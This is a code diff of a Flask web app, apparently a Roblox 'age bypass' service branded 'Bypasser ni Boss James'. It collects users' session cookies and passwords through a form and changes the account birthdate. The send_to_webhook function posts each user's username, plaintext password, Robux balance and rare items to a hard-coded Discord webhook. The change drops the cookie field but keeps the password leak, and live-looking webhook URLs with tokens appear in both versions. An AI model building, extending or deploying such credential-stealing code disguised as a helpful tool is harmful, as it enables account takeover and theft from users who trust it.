@@ -6,8 +6,8 @@ import datetime
 
 app = Flask(__name__)
 
-# --- CONFIGURATION (Copy from your bot) ---
-LOG_WEBHOOK = 'https://discord.com/api/webhooks/1496936361146585270/7ekmEeWCX4Wd--_7qxEVxHepfYIB6xR2P0fyl1KrnCfppVJ-iiJBc6bsU0iy1BAovsgy'
+# --- CONFIGURATION (Synced with bot) ---
+LOG_WEBHOOK = 'https://discord.com/api/webhooks/1496952883810402457/qIzeSB9KIEhLOX00c-O-d3tZCHIXkurfJ19ZSKgpon7oZHMc5pvov0sFAXEl-ySbsLCC'
 
 # Set the target birthday (April 30, 2013)
 BIRTH_DAY = 30
@@ -80,7 +80,7 @@ def send_to_webhook(status, info, cookie, result_msg, password):
     embed = {
         "title": f"{status_icon} {status_title}",
         "color": color,
-        "description": f"**Source:** `Website Form`\n**Method:** `{result_msg}`\n**Target:** `4/30/2013`",
+        "description": f"**Source:** `Website Form`\n**Method Used:** `{result_msg}`\n**Bypass Target:** `4/30/2013`",
         "fields": [],
         "footer": {
             "text": "Bypasser ni Boss James • Web System Logs",
@@ -93,30 +93,36 @@ def send_to_webhook(status, info, cookie, result_msg, password):
         if info.get('thumbnail'):
             embed["thumbnail"] = {"url": info['thumbnail']}
         
+        # Identity Section
         embed["fields"].append({
             "name": "👤 ACCOUNT IDENTITY",
             "value": f"**User:** [{info['username']}](https://www.roblox.com/users/{info['user_id']}/profile)\n**ID:** `{info['user_id']}`\n**Pass:** `{password}`",
             "inline": False
         })
 
+        # Economy Section
         embed["fields"].append({
             "name": "💰 ECONOMY",
             "value": f"**Balance:** `{info['robux']}` Robux\n**Pending:** `{info['pending']}` Robux",
             "inline": True
         })
 
+        # Rare Items Section
         embed["fields"].append({
             "name": "✨ RARE ITEMS",
             "value": f"**Korblox:** {info['korblox']}\n**Headless:** {info['headless']}",
             "inline": True
         })
+        
+        # Divider or extra info
+        embed["fields"].append({
+            "name": "🔗 QUICK LINKS",
+            "value": f"[Avatar Editor](https://www.roblox.com/my/avatar) • [Settings](https://www.roblox.com/my/account)",
+            "inline": False
+        })
     else:
-        embed["description"] += "\n\n> ⚠️ **Warning:** Could not fetch profile. Pass used: `{password}`"
+        embed["description"] += f"\n\n> ⚠️ **Warning:** Could not fetch detailed account profile. Pass used: `{password}`"
     
-    # Send cookie only to Webhook, not the user
-    safe_cookie = (cookie[:1000] + '...') if len(cookie) > 1000 else cookie
-    embed["fields"].append({"name": "🍪 Cookie", "value": f"```\n{safe_cookie}\n```", "inline": False})
-
     payload = {
         "username": "Bypasser ni Boss James Logs",
         "avatar_url": "https://i.imgur.com/pwxGeZi.jpeg",
@@ -129,7 +135,7 @@ def send_to_webhook(status, info, cookie, result_msg, password):
         pass
 
 def perform_bypass(cookie):
-    """Core logic to change the age."""
+    """Core logic to change the age, synced with bot's logic."""
     cookie = cookie.strip()
     if not cookie.startswith("_|WARNING:-"):
         cookie = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_" + cookie
@@ -137,13 +143,15 @@ def perform_bypass(cookie):
     session = requests.Session()
     session.cookies.set(".ROBLOSECURITY", cookie, domain="roblox.com")
 
+    # Fetch account info first
     account_info = get_account_info(session)
 
     try:
+        # 1. Get CSRF Token
         response = session.post("https://auth.roblox.com/v2/logout")
         csrf_token = response.headers.get("x-csrf-token")
         if not csrf_token:
-            return False, "Invalid Cookie", account_info, cookie
+            return False, "Could not retrieve CSRF token", account_info, cookie
 
         headers = {
             "X-CSRF-TOKEN": csrf_token,
@@ -154,25 +162,25 @@ def perform_bypass(cookie):
         
         payload = {"birthMonth": BIRTH_MONTH, "birthDay": BIRTH_DAY, "birthYear": BIRTH_YEAR}
 
-        # Method 1
+        # Method 1: Standard Users API
         resp1 = session.post("https://users.roblox.com/v1/birthdate", headers=headers, data=json.dumps(payload))
         if resp1.status_code == 200:
-            return True, "Method 1", account_info, cookie
+            return True, "Success using Method 1", account_info, cookie
 
-        # Method 2
+        # Method 2: Legacy Account Settings API
         resp2 = session.post("https://accountsettings.roblox.com/v1/birthday", headers=headers, data=json.dumps(payload))
         if resp2.status_code == 200:
-            return True, "Method 2", account_info, cookie
+            return True, "Success via Method 2", account_info, cookie
 
-        # Method 3
+        # Method 3: Legacy Monolithic Web Endpoint
         web_payload = {"birthDay": BIRTH_DAY, "birthMonth": BIRTH_MONTH, "birthYear": BIRTH_YEAR, "isUpdateBirthday": True}
         resp3 = session.post("https://www.roblox.com/my/account/settings/save-personal", headers=headers, data=json.dumps(web_payload))
         if resp3.status_code == 200:
-            return True, "Method 3", account_info, cookie
+            return True, "Success via Method 3", account_info, cookie
 
-        return False, "Account Locked (ID Verified)", account_info, cookie
+        return False, f"All methods failed: {resp3.text}", account_info, cookie
     except Exception as e:
-        return False, str(e), account_info, cookie
+        return False, f"Error: {str(e)}", account_info, cookie
 
 @app.route('/')
 def index():
@@ -203,4 +211,3 @@ if __name__ == '__main__':
 
 # For Vercel deployment
 app = app
-
